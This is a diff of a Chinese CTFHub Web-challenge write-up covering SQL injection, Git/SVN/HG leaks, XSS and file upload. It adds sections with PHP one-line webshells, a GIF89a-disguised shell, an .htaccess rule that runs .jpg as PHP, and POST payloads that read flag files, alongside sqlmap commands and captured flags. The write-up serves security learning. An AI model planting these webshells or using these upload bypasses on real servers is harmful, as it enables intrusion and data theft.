@@ -2,13 +2,15 @@
 
 ## Web前置技能
 
-### SQL注入
+## SQL注入
 
 Web应用开发过程中，为了内容的快速更新，很多开发者使用数据库进行数据存储。而由于开发者在程序编写过程中，传入用户数据的过滤不严格，将可能存在的攻击载荷拼接到SQL查询语句中，再将这些查询语句传递给后端的数据库执行，从而引发实际执行的语句与预期功能不一致的情况。这种攻击被称为**SQL注入攻击**。
+
 大多数应用在开发时将诸如密码等的数据放在数据库中，由于SQL注入攻击能够泄露系统中的敏感信息，使之成为了进入各Web系统的入口级漏洞，因此各大CTF赛事将SQL注入作为Web题目的出题点之一，SQL注入漏洞也是现实场景下最常见的漏洞类型之一。
+
 **SQL注入是开发者对用户输入的参数过滤不严格，导致用户输入的数据能够影响预设查询功能的一种技术，通常将导致数据库的原有信息泄露、篡改，甚至被删除。**
 
-#### 整数型SQL注入
+### 整数型SQL注入
 
 输入1试试？输入1后有俩行回显：一行`ID`一行`Data`。
 
@@ -60,7 +62,7 @@ Web应用开发过程中，为了内容的快速更新，很多开发者使用�
 
 ------
 
-#### 字符型注入
+### 字符型注入
 
 输入1试试？输入1后有俩行回显：一行`ID`一行`Data`，可以看到是`ID`是字符型。
 
@@ -104,7 +106,7 @@ Web应用开发过程中，为了内容的快速更新，很多开发者使用�
 
 ------
 
-#### 报错注入
+### 报错注入
 
 **某些网站为了方便开发者调试会开启错误调试信息，只要此时触发SQL语句的错误就能在页面上看到SQL语句执行后的报错信息，这种攻击方式被称为报错注入。**
 
@@ -150,7 +152,7 @@ Web应用开发过程中，为了内容的快速更新，很多开发者使用�
 
 ------
 
-#### 布尔盲注
+### 布尔盲注
 
 这道题如果真的盲注的话会很费劲，直接启动`Kali-Linux`用`sqlmap`爆破就完事啦。
 
@@ -204,7 +206,7 @@ sqlmap -u "http://challenge-68c4a9c7f10ce011.sandbox.ctfhub.com:10800/?id=1" -D 
 
 ------
 
-#### 时间盲注
+### 时间盲注
 
 时间盲注攻击是利用`sleep()`或`benchmark()`等函数让`mysql`执行时间变长，经常与`if(expr1,expr2,expr3)`语句结合使用，通过页面的响应时间来判断条件是否正确。`if(expr1,expr2,expr3)`含义是：如果`expr1`为`True`则返回`expr2`，否则返回`expr3`。
 
@@ -226,7 +228,7 @@ sqlmap -u "http://challenge-eccdebff49cb9b7c.sandbox.ctfhub.com:10800/?id=1" -D 
 
 ------
 
-#### MySQL结构
+### MySQL结构
 
 输入1试试？输入1后有俩行回显：一行`ID`一行`Data`。
 
@@ -278,7 +280,7 @@ sqlmap -u "http://challenge-eccdebff49cb9b7c.sandbox.ctfhub.com:10800/?id=1" -D 
 
 ------
 
-#### Cookie注入
+### Cookie注入
 
 **解法1：**`Burp Suite`
 
@@ -370,7 +372,7 @@ sqlmap -u "http://challenge-40986a7ba9926439.sandbox.ctfhub.com:10800/" --cookie
 
 ------
 
-#### UA注入
+### UA注入
 
 **解法1：**`Burp Suite`
 
@@ -459,9 +461,9 @@ sqlmap -u "http://challenge-c89ea44d56d68a09.sandbox.ctfhub.com:10800/" --level 
 
 ------
 
-#### Refer注入
+### Refer注入
 
-**解法1：**`Burp Suite`
+#### 解法1：`Burp Suite`
 
 `union select`可以进行联合查询，`id=-1`表示一个不存在的`id`，`database()`回显当前连接的数据库，修改`Referer`为以下代码可以查询到当前数据库为`sqli`：
 
@@ -501,7 +503,7 @@ sqlmap -u "http://challenge-c89ea44d56d68a09.sandbox.ctfhub.com:10800/" --level 
 
 ------
 
-**解法2：**`sqlmap`
+#### 解法2：`sqlmap`
 
 `sqlmap`中有一个参数是`--level`，表示探测等级，其默认值为`1`，`level>=2`时会检测`Cookie`注入，`level>=3`时会检测`User-Agent`注入和`Referer`注入，`level>=5`时会检测`host`注入。以下代码可以爆破出当前网站中的所有数据库：
 
@@ -547,7 +549,7 @@ sqlmap -u "http://challenge-72f077dfbff2b932.sandbox.ctfhub.com:10800/" --level 
 
 ------
 
-#### 过滤空格
+### 过滤空格
 
 输入1试试？输入1后有俩行回显：一行`ID`一行`Data`。
 
@@ -589,11 +591,11 @@ sqlmap -u "http://challenge-72f077dfbff2b932.sandbox.ctfhub.com:10800/" --level 
 
 ------
 
-### 信息泄露
+## 信息泄露
 
-#### Git泄露
+### Git泄露
 
-##### Log
+#### Log
 
 > 当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。请尝试使用BugScanTeam的GitHack完成本题
 
@@ -723,7 +725,7 @@ ctfhub{21b194cfff1432ef1c38d79c}
 
 ------
 
-##### Stash
+#### Stash
 
 > 当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。请尝试使用BugScanTeam的GitHack完成本题
 
@@ -855,7 +857,7 @@ ctfhub{7784261fb20081dfe2abe94a}
 
 ------
 
-##### Index
+#### Index
 
 > 当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。请尝试使用BugScanTeam的GitHack完成本题
 
@@ -957,7 +959,7 @@ ctfhub{db36e890d8ae9388e2d950c5}
 
 提交`ctfhub{db36e890d8ae9388e2d950c5}`即可。
 
-#### SVN泄露
+### SVN泄露
 
 使用 [svnExploit](https://github.com/admintony/svnExploit) 未果。
 
@@ -1072,7 +1074,7 @@ ctfhub{e99d45499cf367688c931aa2}
 
 ------
 
-#### HG泄露
+### HG泄露
 
 ```bash
 ┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
@@ -1136,11 +1138,11 @@ ctfhub{f90b6c76f97124cd83e38e9b}
 
 ------
 
-### 密码口令
+## 密码口令
 
-#### 默认口令
+### 默认口令
 
-##### 常见网络安全设备弱口令(默认口令)
+**常见网络安全设备弱口令(默认口令)**
 
 | 设备                                  | 默认账号      | 默认密码                          |
 | ------------------------------------- | ------------- | --------------------------------- |
@@ -1245,9 +1247,9 @@ ctfhub{f90b6c76f97124cd83e38e9b}
 
 ------
 
-### XSS
+## XSS
 
-#### 反射型
+### 反射型
 
 利用 [xsscom](http://xsscom.com/) 来获取与靶机的交互信息，新建项目、默认模块、无keepsession。
 
@@ -1258,7 +1260,7 @@ Send URL to Bot中URL后的输入框填写`http://challenge-f218d4eec3b4f897.san
 
 ------
 
-#### 存储型
+### 存储型
 
 利用 [xsscom](http://xsscom.com/) 来获取与靶机的交互信息，新建项目、默认模块、无keepsession。
 
@@ -1269,7 +1271,7 @@ Send URL to Bot中URL后的输入框填写`http://challenge-c41534fe7b97ead5.san
 
 ------
 
-#### DOM反射
+### DOM反射
 
 利用 [xsscom](http://xsscom.com/) 来获取与靶机的交互信息，新建项目、默认模块、无keepsession。
 
@@ -1281,7 +1283,7 @@ Send URL to Bot中URL后的输入框填写`http://challenge-c41534fe7b97ead5.san
 
 ------
 
-#### DOM跳转
+### DOM跳转
 
 进入网站，直接查看源代码，下面是关键代码，这里有`XSS`漏洞：
 
@@ -1306,7 +1308,7 @@ Send URL to Bot中URL后的输入框填写`http://challenge-c41534fe7b97ead5.san
 
 ------
 
-#### 过滤空格
+### 过滤空格
 
 利用 [xsscom](http://xsscom.com/) 来获取与靶机的交互信息，新建项目、默认模块、无keepsession。我们可以用`/`来代替空格，
 
@@ -1318,7 +1320,7 @@ Send URL to Bot中URL后的输入框填写`http://challenge-c41534fe7b97ead5.san
 
 ------
 
-#### 过滤关键词
+### 过滤关键词
 
 利用 [xsscom](http://xsscom.com/) 来获取与靶机的交互信息，新建项目、默认模块、无keepsession。
 
@@ -1340,7 +1342,7 @@ Send URL to Bot中URL后的输入框填写`http://challenge-c41534fe7b97ead5.san
 
 ------
 
-#### 动态加载器
+### 动态加载器
 
 打开靶机后看到以下页面：
 
@@ -1419,9 +1421,9 @@ ctfhub{de2eb2419998c06d2a75733f}
 
 ------
 
-### 文件上传
+## 文件上传
 
-#### 无验证
+### 无验证
 
 编写`PHP`一句话木马，并上传文件。
 
@@ -1444,6 +1446,10 @@ ctfhub{de2eb2419998c06d2a75733f}
 <%@ Page Language="Jscript"%> <%eval(Request.Item["pass"],"unsafe");%>
 ```
 
+```html
+<script language="php">@eval($_POST['shell']);</script>
+```
+
 通过`AntSword`连接靶机的`webshell`并打开终端，
 
 ```bash
@@ -1453,5 +1459,141 @@ $ cat flag_2492722517.php
 ```
 
 提交`ctfhub{ebfc397b4ed065684160083d}`即可。
+
+------
+
+### 前端验证
+
+首先在浏览器设置中禁用`JavaScript`脚本。
+
+Chrome的设置路径是`chrome://settings/content/javascript`，不允许网站使用`JavaScript`。
+
+编写`PHP`一句话木马，并上传文件。
+
+```php
+<?php @eval($_POST['t0ur1st']); ?>
+```
+
+上传成功后，看到页面信息：
+
+> 上传文件相对路径
+> upload/1.php
+
+用`AntSword`连接该一句话木马文件控制靶机。在`/var/www/html/flag_1702317308.php`看到`flag`。
+
+或者可以用`HackBar`构造`POST`请求，比如`t0ur1st=phpinfo();`可以看到靶机的`PHP`相关信息。
+
+查看靶机根目录`t0ur1st=var_dump(scandir("/"));`，没有找到`flag`。
+
+> array(22) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(10) ".dockerenv" [3]=> string(3) "bin" [4]=> string(4) "boot" [5]=> string(3) "dev" [6]=> string(3) "etc" [7]=> string(4) "home" [8]=> string(3) "lib" [9]=> string(5) "lib64" [10]=> string(5) "media" [11]=> string(3) "mnt" [12]=> string(3) "opt" [13]=> string(4) "proc" [14]=> string(4) "root" [15]=> string(3) "run" [16]=> string(4) "sbin" [17]=> string(3) "srv" [18]=> string(3) "sys" [19]=> string(3) "tmp" [20]=> string(3) "usr" [21]=> string(3) "var" }
+
+`PHP`中的 `glob()` 函数支持通配符，能快速模糊匹配字符串，非常适合找`flag`文件。`glob()`函数不支持递归子目录，但我们可以用`array_merge()`组合，尝试在`CTF`常见的`flag`文件路径中模糊匹配。
+
+```php
+t0ur1st=var_dump(array_merge(
+    glob('/*flag*'),
+    glob('/home/*/*flag*'),
+    glob('/var/www/*/*flag*'),
+    glob('/tmp/*flag*')
+));
+```
+
+靶机信息如下，`flag`文件路径为`/var/www/html/flag_1702317308.php`。
+
+> array(1) { [0]=> string(33) "/var/www/html/flag_1702317308.php" }
+
+接着，我们可以使用`var_dump(file_get_contents())`显示文件内容。
+
+```php
+t0ur1st=var_dump(file_get_contents('/var/www/html/flag_1702317308.php'));
+```
+
+右键查看源码，可以看到信息如下：
+
+> string(42) "<?php // ctfhub{9d40626b60dcac5ecef7b4dc}
+> "
+
+或者使用`print(file_get_contents())`显示文件内容。
+
+```php
+t0ur1st=print(file_get_contents('/var/www/html/flag_1702317308.php'));
+```
+
+右键查看源码，可以看到信息如下：
+
+> <?php // ctfhub{9d40626b60dcac5ecef7b4dc}
+
+提交`ctfhub{9d40626b60dcac5ecef7b4dc}`即可。
+
+------
+
+### .htaccess
+
+> htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。
+
+如果直接上传`.php`后缀的一句话木马，靶机会显示“文件类型不匹配”。
+
+编写`.htaccess`文件，让服务器将所有`.jpg`文件当作`.php`文件处理。
+
+```htaccess
+AddType application/x-httpd-php .jpg
+```
+
+上传文件后，靶机显示信息如下：
+
+> 上传文件相对路径
+> upload/.htaccess
+
+我们可以编写`PHP`一句话木马，用`burp suite`抓包后修改成`.jpg`后缀和文件类型`image/jpeg`后上传。
+
+```php
+<?php @eval($_POST['t0ur1st']); ?>
+```
+
+也可以直接在`.php`文件中写入以下信息，然后修改文件后缀`.jpg`，再直接上传。
+
+```php
+GIF89a
+<?php @eval($_POST['t0ur1st']); ?>
+```
+
+文件上传成功后，可以直接用`AntSword`连接靶机，拿到控制权限后找出`flag`。
+
+也可以使用`HackBar`构造`POST`请求访问`/upload/1.jpg`。查看根目录。
+
+```php
+t0ur1st=var_dump(scandir("/"));
+```
+
+> GIF89a array(22) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(10) ".dockerenv" [3]=> string(3) "bin" [4]=> string(4) "boot" [5]=> string(3) "dev" [6]=> string(3) "etc" [7]=> string(4) "home" [8]=> string(3) "lib" [9]=> string(5) "lib64" [10]=> string(5) "media" [11]=> string(3) "mnt" [12]=> string(3) "opt" [13]=> string(4) "proc" [14]=> string(4) "root" [15]=> string(3) "run" [16]=> string(4) "sbin" [17]=> string(3) "srv" [18]=> string(3) "sys" [19]=> string(3) "tmp" [20]=> string(3) "usr" [21]=> string(3) "var" }
+
+在常见的位置查找`flag`文件。
+
+```php
+t0ur1st=var_dump(array_merge(
+    glob('/*flag*'),
+    glob('/home/*/*flag*'),
+    glob('/var/www/*/*flag*'),
+    glob('/tmp/*flag*')
+));
+```
+
+靶机信息如下，`flag`文件路径为`/var/www/html/flag_858924154.php`。
+
+> GIF89a array(1) { [0]=> string(32) "/var/www/html/flag_858924154.php" }
+
+查看`flag`文件内容。
+
+```php
+t0ur1st=var_dump(file_get_contents('/var/www/html/flag_858924154.php'));
+```
+
+右键查看网页源码，在注释中可以找到`flag`。
+
+> GIF89a
+> string(42) "<?php // ctfhub{23218eb506abd3509c52ffb7}
+> "
+
+提交`ctfhub{23218eb506abd3509c52ffb7}`即可。
 
 ------
